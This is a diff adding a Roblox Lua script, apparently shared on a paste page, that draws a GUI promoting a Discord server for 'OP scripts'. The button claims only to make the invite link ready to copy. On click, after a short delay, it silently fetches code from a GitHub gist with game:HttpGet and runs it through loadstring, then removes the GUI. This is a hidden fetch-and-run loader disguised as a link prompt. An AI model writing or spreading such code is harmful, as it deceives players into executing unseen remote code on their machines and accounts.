@@ -1,0 +1,73 @@
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local JoinButton = Instance.new("TextButton")
+local LinkBox = Instance.new("TextBox")
+local discordLink = "https://discord.gg/XJuhDdgfcD"  
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+Frame.Size = UDim2.new(0, 350, 0, 200)
+Frame.Position = UDim2.new(0.5, -175, 0.5, -100)
+Frame.BorderSizePixel = 0
+Frame.BackgroundTransparency = 0.1
+Frame.ClipsDescendants = true
+Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame.Active = true
+Frame.Draggable = true  
+
+TextLabel.Parent = Frame
+TextLabel.Text = "Join our Discord server for more OP scripts!"
+TextLabel.Size = UDim2.new(1, 0, 0.3, 0)
+TextLabel.TextColor3 = Color3.new(1, 1, 1)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Font = Enum.Font.GothamBold
+TextLabel.TextSize = 16
+TextLabel.Position = UDim2.new(0, 0, 0.1, 0)
+
+LinkBox.Parent = Frame
+LinkBox.Text = discordLink
+LinkBox.Size = UDim2.new(0.8, 0, 0.2, 0)
+LinkBox.Position = UDim2.new(0.1, 0, 0.45, 0)
+LinkBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+LinkBox.TextColor3 = Color3.new(1, 1, 1)
+LinkBox.Font = Enum.Font.Gotham
+LinkBox.TextSize = 14
+LinkBox.ClearTextOnFocus = false
+LinkBox.TextEditable = false 
+
+JoinButton.Parent = Frame
+JoinButton.Text = "Join for more OP scripts!!"
+JoinButton.Size = UDim2.new(0.8, 0, 0.2, 0)
+JoinButton.Position = UDim2.new(0.1, 0, 0.7, 0)
+JoinButton.BackgroundColor3 = Color3.fromRGB(72, 104, 255)
+JoinButton.TextColor3 = Color3.new(1, 1, 1)
+JoinButton.Font = Enum.Font.Gotham
+JoinButton.TextSize = 14
+JoinButton.BorderSizePixel = 0
+JoinButton.AutoButtonColor = true
+
+JoinButton.MouseEnter:Connect(function()
+    JoinButton.BackgroundColor3 = Color3.fromRGB(62, 94, 235)
+end)
+
+JoinButton.MouseLeave:Connect(function()
+    JoinButton.BackgroundColor3 = Color3.fromRGB(72, 104, 255)
+end)
+
+JoinButton.MouseButton1Click:Connect(function()
+    TextLabel.Text = "Copy the link from the box above to join!"
+    JoinButton.Text = "Link Ready to Copy"
+
+    wait(2)  
+
+loadstring(game:HttpGet('https://gist.githubusercontent.com/Raiden84200/b58404842d12f00793528777d2cbae3f/raw/96dfc7a3ed20cc6a6504a6589118bdede00ddbc4/lua'))()
+
+    wait(10)
+    ScreenGui:Destroy()
+end)
+Comments
+0
